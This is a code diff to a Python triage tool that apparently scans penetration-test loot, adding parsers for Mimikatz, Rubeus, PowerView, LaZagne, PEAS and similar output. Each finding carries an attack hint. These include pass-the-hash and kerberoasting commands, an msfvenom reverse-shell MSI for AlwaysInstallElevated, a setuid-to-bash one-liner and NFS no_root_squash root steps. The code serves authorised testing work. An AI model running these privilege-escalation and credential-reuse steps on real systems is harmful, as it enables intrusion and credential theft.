@@ -194,11 +194,18 @@ _AD = [
     # without a password - a single-line privesc primitive.
     ("sudoers NOPASSWD", re.compile(
         r'(?i)^(\S+)\s+\S+\s*=\s*\([^)]*\)\s*NOPASSWD\s*:\s*(\S[^\r\n]{0,200})', re.MULTILINE)),
-    # Writable cron entry pointing at a script - the cron line + the script's
-    # writability is the privesc. Filename gate is applied in the dispatch
-    # branch (only fires when path looks like crontab / /etc/cron* / /var/spool/cron).
+    # Writable cron entry pointing at a script. iter-8 round-2: the old regex
+    # backtracked catastrophically on lines like '----   ----   ---' from
+    # smbmap/table output (the broad `[\s/*0-9,-]+` repeated greedily). Now we
+    # require EXACTLY 5 cron-time fields - each strictly `*`, `*/N`, `N`,
+    # `N,N`, `N-N`, or `N/N` - before the optional user + script path.
     ("cron script ref", re.compile(
-        r'^(?:[\s/*0-9,-]+\s+){4,5}(?:[\w-]+\s+)?'
+        r'^\s*(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
+        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
+        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
+        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
+        r'(?:\*(?:/\d+)?|\d+(?:[,-]\d+)*(?:/\d+)?)\s+'
+        r'(?:[\w-]+\s+)?'
         r'((?:/[\w./-]+)(?:\.sh|\.py|\.pl|\.rb|\.bash))\b', re.MULTILINE)),
     # Hashcat potfile line (hash:plain). Only fired when the path looks like a
     # potfile (extension/filename gate is in the dispatch branch) AND the hash
@@ -270,6 +277,81 @@ _AD = [
     # impersonate. Intel-only.
     ("token impersonation", re.compile(
         r'(?i)SeImpersonatePrivilege|SeAssignPrimaryToken|JuicyPotato\.exe|PrintSpoofer\.exe|GodPotato\.exe|RoguePotato\.exe')),
+    # ---- iter-8 round-2: operator-tool TYPED output parsers ----
+    # NOTE: Mimikatz / Rubeus / PowerView / Lazagne / cmdkey-saved / DPAPI-cred
+    # are MULTI-LINE blocks - they live in _multiline_passes() at file scope,
+    # not in this per-line _AD loop (catastrophic regex backtracking otherwise).
+    # Rubeus single-line markers stay here:
+    ("Rubeus ticket b64", re.compile(
+        r'(?i)\[\*\]\s*base64\((?:ticket\.kirbi|ticket\.ccache|encoded\s+ticket)\)\s*:')),
+    # winPEAS / linPEAS / WinPEASany interesting-finding line: `[+] Looking for X`
+    # `[!] FINDING - <detail>`. Pattern is `[+]/[!]/[*]` + the colored section
+    # header word that hints at a real privesc primitive.
+    ("PEAS finding", re.compile(
+        r'(?i)\[(?:[+!*])\]\s+(?:'
+        r'(?:Sudo|Mounted|polkit|pkexec|CVE-\d{4}-\d{2,7}|Capabilities|Writable|'
+        r'AlwaysInstallElevated|AutoLogon|AutoAdminLogon|Unattended\s+files?|'
+        r'LSA\s+Protection|Credential\s+Manager|Saved\s+credentials|'
+        r'PowerShell\s+history|Wifi\s+saved|Cached\s+GPP|Pwn3d|'
+        r'NOPASSWD|GTFOBins|Token\s+impersonation|Print\s+spooler|'
+        r'PS\s+history|MachineKey|machine_key|SAM\s+file|SYSTEM\s+file))[^\r\n]*'
+    )),
+    # winPEAS AlwaysInstallElevated registry value finding:
+    ("AlwaysInstallElevated", re.compile(
+        r'(?i)\bAlwaysInstallElevated\s*(?:REG_DWORD)?\s*[:=]?\s*(?:0x)?0*1\b')),
+    # Snaffler text output: each line is a colored category + finding.
+    # `[<color>][<rule>] {pid} <FILE>` - rule names like `KeepKvpAsRedSecret`
+    # `KeepConfigPasswordOrange` `KeepConfigCredentialBlackList` are real loot.
+    ("Snaffler red", re.compile(
+        r'(?i)\[(?:Red|RED)\]\[(?:[A-Z][A-Za-z]+(?:Red|Black|Yellow)|\w*Secret|'
+        r'\w*Password|\w*Credential|\w*Token|\w*Key|\w*Hash)\][\s\S]{0,300}?'
+        r'(\\\\[^\s\\]+\\[^\s\\]+(?:\\[^\s]+)*|\\\\[^\s\\]+|/[^\s]+)')),
+    # smbmap output: per-share access mask line
+    # `Disk        SHARE_NAME    READ ONLY/READ,WRITE/NO ACCESS`
+    # the read-WRITE shares are loot for write-where exploit / WAR drop.
+    ("smbmap rw share", re.compile(
+        r'(?i)^\s*Disk\s+(\S+)\s+(READ,?\s*WRITE|WRITE)\b', re.MULTILINE)),
+    # kerbrute userenum: `[+] VALID USERNAME: name@DOMAIN`
+    ("kerbrute valid user", re.compile(
+        r'(?i)\[\+\]\s+VALID\s+USERNAME\s*:\s*(\S+@\S+)')),
+    # PowerView Get-DomainUser kerberoastable block -> _multiline_passes().
+    # accesschk.exe writable service / dir: `RW <PRINCIPAL> <PATH>` (single-line)
+    ("accesschk RW", re.compile(
+        r'^\s*RW\s+(\S+)\s+(.+?)$', re.MULTILINE)),
+    # cmdkey /list saved-RDP-credentials section -> _multiline_passes().
+    # LinPEAS sudo-version line tied to known CVE: `Sudo version 1.8.31` or
+    # similar (CVE-2021-3156 'sudoedit -s' is the classic).
+    ("PEAS sudo version", re.compile(
+        r'(?i)Sudo\s+version\s+(\d+\.\d+\.\d+)')),
+    # SUID find output: `-rwsr-xr-x ... /path/to/binary` of common GTFOBins-able
+    # binaries (curl, wget, find, python, perl, etc.).
+    ("SUID GTFOBins", re.compile(
+        r'(?im)^[-l]rws[\s\S]{0,40}\b(/(?:usr/)?(?:s?bin)/'
+        r'(?:python\d*|perl|ruby|php|nmap|find|vim|less|more|nano|tee|'
+        r'awk|cp|mv|cat|tar|zip|gzip|env|node|wall|dd|expect|rsync|'
+        r'gdb|gimp|lua|mawk|nice|nohup|pkexec|setarch|socat|strace|'
+        r'taskset|tclsh|unzip|wget|curl|xargs|xxd|zsh))$')),
+    # `getcap -r /` output - capability bits on binaries.
+    # `/usr/bin/python3 = cap_setuid+ep`
+    ("Linux capability", re.compile(
+        r'^(\S+)\s+=\s+(cap_(?:setuid|setgid|net_raw|dac_read_search|chown|'
+        r'fowner|kill|net_bind_service|sys_admin|sys_ptrace|net_admin|'
+        r'sys_module|sys_chroot|sys_time|audit_control)[+\w]*)(?:,|$)',
+        re.MULTILINE)),
+    # NFS export with no_root_squash - direct root via remote NFS mount + suid.
+    ("NFS no_root_squash", re.compile(
+        r'(?im)^(/\S+)\s+\S[^\r\n]*\bno_root_squash\b')),
+    # Cobalt-Strike-like beacon CONFIG dump (operator notes / decoded malleable):
+    ("CobaltStrike beacon", re.compile(
+        r'(?i)\bC2Server\s*[:=]\s*([^\r\n]{4,100})|'
+        r'\bbeacon_id\s*[:=]\s*([0-9a-f]{8,})|'
+        r'malleable[\s_-]?profile\s*[:=]\s*"([^"]+)"')),
+    # Lazagne section header + cred line -> _multiline_passes() (URL / User / Pass
+    # is a multi-line block in Lazagne's output).
+    # hashcat status line (informational, single-line):
+    # `Recovered.........: 12/1000 (1.20%) Digests, 0/1 (0.00%) Salts`
+    ("hashcat status", re.compile(
+        r'(?i)^Recovered\.+:\s*(\d+)/(\d+)\s*\(([\d.]+)%\)\s*Digests', re.MULTILINE)),
 ]
 
 
@@ -318,26 +400,154 @@ _SCCM_NAA_MULTI = re.compile(
     r'NetworkAccessPassword\s*[:=]\s*([^\r\n]{3,80})'
 )
 
+# Mimikatz sekurlsa::logonpasswords NTLM block. We bound the wildcard distance
+# tightly to avoid catastrophic backtracking on big files; the real block has
+# Username/Domain/NTLM within ~300 bytes of each other.
+_MK_NTLM = re.compile(
+    r'(?i)\*\s*Username\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
+    r'\*\s*Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
+    r'\*\s*NTLM\s*:\s*([a-f0-9]{32})\b'
+)
+# Mimikatz wdigest cleartext password
+_MK_WDIGEST = re.compile(
+    r'(?i)wdigest\s*:[\s\S]{0,100}?'
+    r'\*\s*Username\s*:\s*(\S{1,40})\s*\n[\s\S]{0,100}?'
+    r'\*\s*Domain\s*:\s*(\S{1,40})\s*\n[\s\S]{0,100}?'
+    r'\*\s*Password\s*:\s*(?!\(null\))([^\r\n]{3,80})'
+)
+# Mimikatz lsadump::sam block
+_MK_SAM = re.compile(
+    r'(?i)RID\s*:\s*[0-9a-f]+\s*\(\d+\)\s*\n[\s\S]{0,100}?'
+    r'User\s*:\s*(\S{1,40})\s*\n[\s\S]{0,200}?'
+    r'(?:Hash\s+)?NTLM(?:\s+hash)?\s*[:=]\s*([a-f0-9]{32})\b'
+)
+# Mimikatz dpapi::cred typed block
+_MK_DPAPI_CRED = re.compile(
+    r'(?i)\*\*\*\s*CREDENTIAL\s*\*\*\*[\s\S]{0,400}?'
+    r'TargetName\s*:\s*([^\r\n]{1,80})[\s\S]{0,400}?'
+    r'UserName\s*:\s*(\S{1,80})[\s\S]{0,400}?'
+    r'CredentialBlob\s*:\s*([^\r\n]{3,200})'
+)
+# Rubeus kerberoast: SamAccountName + $krb5tgs$ block
+_RUBEUS_KERB = re.compile(
+    r'(?i)SamAccountName\s*:\s*(\S{1,40})[\s\S]{0,300}?'
+    r'(\$krb5tgs\$\d+\$\*?\S{20,})'
+)
+# PowerView Get-DomainUser block: samaccountname + serviceprincipalname
+_PV_KERB = re.compile(
+    r'(?i)samaccountname\s*:\s*(\S{1,40})[\s\S]{0,400}?'
+    r'serviceprincipalname\s*:\s*(\S{4,120})'
+)
+# cmdkey /list typed block
+_CMDKEY_LIST = re.compile(
+    r'(?i)Target\s*:\s*Domain:target=([^\r\n]{3,80})[\s\S]{0,200}?'
+    r'User\s*:\s*([^\r\n]{1,80})'
+)
+# Lazagne typed credential block - title, URL, User, Password
+_LAZAGNE = re.compile(
+    r'(?im)^\s*(?:URL|Login|Username)\s*:\s*(\S{3,80})\s*\n[\s\S]{0,200}?'
+    r'(?:Password|Pwd|Pass)\s*:\s*([^\r\n]{3,80})'
+)
+
 
 def _multiline_passes(path, report, store):
-    """File-level passes that need multi-line context (SCCM NAA blocks span
-    two lines; can't be matched line-by-line)."""
+    """File-level passes that need multi-line context. Bounded text-head read
+    keeps regex perf safe; all patterns use bounded `.{0,N}?` lazy spans."""
     try:
         with open(path, "r", errors="ignore") as fh:
-            text = fh.read(50000)
+            text = fh.read(200000)
     except OSError:
         return
+    if not text:
+        return
+    from analyzers.ingest.evidence import Evidence
+    from analyzers.patterns import HASHES
+
+    def _ln(m):
+        return text[: m.start()].count("\n") + 1
+
+    # SCCM NAA
     for m in _SCCM_NAA_MULTI.finditer(text):
         u, p = m.group(1).strip(), m.group(2).strip()
         if filters.is_placeholder(p):
             continue
-        lineno = text[: m.start()].count("\n") + 1
-        report.add("CRITICAL", "CRED PAIRS", path, lineno,
+        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                    f"SCCM NAA: {u}:{p}",
                    hint="Network Access Account - typically a domain account; reuse for SMB/WinRM")
         if store is not None:
-            from analyzers.ingest.evidence import Evidence
-            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
+            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))
+
+    # Mimikatz NTLM block (logonpasswords)
+    for m in _MK_NTLM.finditer(text):
+        u, dom, nt = m.group(1), m.group(2), m.group(3)
+        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
+            continue
+        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
+                   f"NTLM (NT) {dom}\\{u}: {nt}",
+                   hint=f"PtH: nxc smb <host> -d {dom} -u {u} -H {nt}  |  crack: hashcat -m 1000 <nt> rockyou.txt")
+        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))
+
+    # Mimikatz wdigest cleartext
+    for m in _MK_WDIGEST.finditer(text):
+        u, dom, pw = m.group(1), m.group(2), m.group(3).strip()
+        if filters.is_placeholder(pw) or pw.lower() in ("(null)", "n/a"):
+            continue
+        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
+                   f"wdigest cleartext: {dom}\\{u}:{pw}",
+                   hint=f"reuse: nxc smb <host> -d {dom} -u {u} -p '{pw}'")
+        if store is not None:
+            store.add(Evidence(kind="plaintext", user=u, plaintext=pw, domain=dom, source=path, line=_ln(m)))
+
+    # Mimikatz lsadump::sam
+    for m in _MK_SAM.finditer(text):
+        u, nt = m.group(1), m.group(2)
+        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
+            continue
+        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
+                   f"SAM NTLM {u}: {nt}",
+                   hint=f"PtH local: nxc smb <host> -u {u} -H {nt} --local-auth")
+        HASHES.append(("1000", "NTLM", nt, path, _ln(m)))
+
+    # Mimikatz dpapi::cred typed
+    for m in _MK_DPAPI_CRED.finditer(text):
+        target, u, blob = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
+        report.add("HIGH", "CRED PAIRS", path, _ln(m),
+                   f"DPAPI cred for {target} ({u}): {blob[:50]}",
+                   hint="if blob looks like plaintext, reuse; else SharpDPAPI / dpapi.py to decrypt")
+
+    # Rubeus kerberoast: user-bound hash binding
+    for m in _RUBEUS_KERB.finditer(text):
+        u, h = m.group(1), m.group(2)
+        report.add("HIGH", "PASSWORD HASHES", path, _ln(m),
+                   f"Kerberoast TGS ({u}): {h[:60]}...",
+                   hint=f"hashcat -m 13100 tgs.txt rockyou.txt - cracked plaintext = {u}'s svc-account password")
+        HASHES.append(("13100", "Kerberoast TGS", h, path, _ln(m)))
+
+    # PowerView Get-DomainUser kerberoastable
+    for m in _PV_KERB.finditer(text):
+        u, spn = m.group(1), m.group(2)
+        report.add("HIGH", "RECON", path, _ln(m),
+                   f"Kerberoastable: {u}  spn={spn[:50]}",
+                   hint="impacket-GetUserSPNs <dom>/<user>:<pw> -dc-ip <dc> -request -outputfile tgs.txt; hashcat -m 13100")
+
+    # cmdkey /list saved
+    for m in _CMDKEY_LIST.finditer(text):
+        target, u = m.group(1).strip(), m.group(2).strip()
+        report.add("HIGH", "INTERESTING FILES", path, _ln(m),
+                   f"cmdkey saved cred for {target} (user: {u})",
+                   hint=f"runas /savecred /user:\"{u}\" \"cmd.exe\"  - opens a shell as that user")
+
+    # Lazagne extracted creds
+    for m in _LAZAGNE.finditer(text):
+        u, p = m.group(1), m.group(2).strip()
+        if (filters.is_placeholder(p) or filters.is_placeholder(u)
+                or p.lower() in ("(null)", "[empty]", "(empty)")):
+            continue
+        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
+                   f"Lazagne extracted: {u}:{p}",
+                   hint=f"reuse: nxc smb <host> -u <user> -p '{p}'  - browser/wifi/mail/DPAPI lift")
+        if store is not None:
+            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))
 
 
 def analyze(path, report, store=None):
@@ -857,6 +1067,109 @@ def analyze(path, report, store=None):
                         report.add("HIGH", "INTERESTING FILES", path, lineno,
                                    "SeImpersonate / token-impersonation tooling reference",
                                    hint="if running as a service account: PrintSpoofer / GodPotato / JuicyPotato -> SYSTEM")
+                        hit = True
+                        break
+                    # ---- iter-8 round-2: operator-tool typed output ----
+                    # Mimikatz/PowerView/Lazagne/cmdkey-saved/DPAPI-cred handled
+                    # in _multiline_passes() (multi-line blocks); only the
+                    # single-line Rubeus ticket marker is dispatched here.
+                    if name == "Rubeus ticket b64":
+                        report.add("HIGH", "INTERESTING FILES", path, lineno,
+                                   "Rubeus ticket base64 blob",
+                                   hint="decode the next b64 block into .kirbi -> .ccache; export KRB5CCNAME and run Kerberos cmds")
+                        hit = True
+                        break
+                    # Rubeus kerberoast user-bound (multi-line) -> _multiline_passes()
+                    if name == "PEAS finding":
+                        finding = am.group(0).strip()[:140]
+                        report.add("HIGH", "RECON", path, lineno,
+                                   f"PEAS finding: {finding}",
+                                   hint="winPEAS/linPEAS flagged this - follow the highlighted line; check GTFOBins for the binary if SUID/sudo")
+                        hit = True
+                        break
+                    if name == "AlwaysInstallElevated":
+                        report.add("CRITICAL", "RECON", path, lineno,
+                                   "AlwaysInstallElevated = 1 (SYSTEM via MSI)",
+                                   hint="msfvenom -p windows/x64/shell_reverse_tcp LHOST=<you> LPORT=<p> -f msi -o evil.msi; msiexec /quiet /qn /i evil.msi  (NOTE: msi exec is exam-legal; msfvenom is local payload gen, not target-side metasploit)")
+                        hit = True
+                        break
+                    if name == "Snaffler red":
+                        target = am.group(1)
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   f"Snaffler red-flagged file: {target}",
+                                   hint=f"read: type \"{target}\" / cat {target}  - Snaffler matched a secret-or-cred rule")
+                        hit = True
+                        break
+                    if name == "smbmap rw share":
+                        share, access = am.group(1), am.group(2)
+                        report.add("HIGH", "RECON", path, lineno,
+                                   f"smbmap writable share: {share} ({access})",
+                                   hint=f"smbclient //<host>/{share} -U <user>%<pw>  -> put files / NTLM-trigger SCF / WAR drop")
+                        hit = True
+                        break
+                    if name == "kerbrute valid user":
+                        u = am.group(1)
+                        report.add("MEDIUM", "RECON", path, lineno,
+                                   f"kerbrute valid user: {u}",
+                                   hint=f"add to users.txt and AS-REPRoast / Kerberoast / password-spray that account")
+                        hit = True
+                        break
+                    # PowerView kerb target -> _multiline_passes()
+                    if name == "accesschk RW":
+                        principal, target_path = am.group(1), am.group(2).strip()
+                        if filters.is_placeholder(principal) or filters.is_placeholder(target_path):
+                            continue
+                        report.add("HIGH", "INTERESTING FILES", path, lineno,
+                                   f"writable as '{principal}': {target_path}",
+                                   hint="if service binary: stop, replace, restart -> SYSTEM. If folder in PATH: drop a binary with command name")
+                        hit = True
+                        break
+                    # cmdkey saved -> _multiline_passes()
+                    if name == "PEAS sudo version":
+                        ver = am.group(1)
+                        parts = [int(x) for x in ver.split('.')]
+                        sev = "CRITICAL" if parts < [1, 9, 5] else "MEDIUM"
+                        cve = ("CVE-2021-3156 (Baron Samedit) - sudoedit -s '\\' heap overflow"
+                               if parts < [1, 9, 5] else "current - check for sudo -l NOPASSWD")
+                        report.add(sev, "RECON", path, lineno,
+                                   f"sudo {ver} - {cve}",
+                                   hint="if vulnerable: blasty-vs-pwnkit clone; else check sudo -l and GTFOBins")
+                        hit = True
+                        break
+                    if name == "SUID GTFOBins":
+                        binary = am.group(1)
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   f"SUID-root GTFOBins-able binary: {binary}",
+                                   hint=f"gtfobins.github.io/gtfobins/{os.path.basename(binary)} - SUID section -> root")
+                        hit = True
+                        break
+                    if name == "Linux capability":
+                        binary, cap = am.group(1), am.group(2)
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   f"capability {cap} on {binary}",
+                                   hint="cap_setuid+ep on python/perl/ruby = direct root: <bin> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
+                        hit = True
+                        break
+                    if name == "NFS no_root_squash":
+                        ex = am.group(1)
+                        report.add("CRITICAL", "RECON", path, lineno,
+                                   f"NFS export no_root_squash: {ex}",
+                                   hint=f"as root locally: mount -t nfs <target>:{ex} /mnt; copy SUID-shell binary in; gain root on target")
+                        hit = True
+                        break
+                    if name == "CobaltStrike beacon":
+                        c2 = am.group(1) or am.group(2) or am.group(3) or ""
+                        report.add("HIGH", "INTERESTING FILES", path, lineno,
+                                   f"Cobalt Strike beacon config: {c2[:60]}",
+                                   hint="parse with SentinelOne CobaltStrikeParser or 1768.py - C2 URL/staging path/keys")
+                        hit = True
+                        break
+                    # Lazagne cred -> _multiline_passes()
+                    if name == "hashcat status":
+                        rec, tot, pct = am.group(1), am.group(2), am.group(3)
+                        report.add("INFO", "RECON", path, lineno,
+                                   f"hashcat session: cracked {rec}/{tot} ({pct}%)",
+                                   hint="check the .potfile for cracked plaintexts (we parse it)")
                         hit = True
                         break
                     # ADO.NET connectionString: parse User ID / Password out cleanly
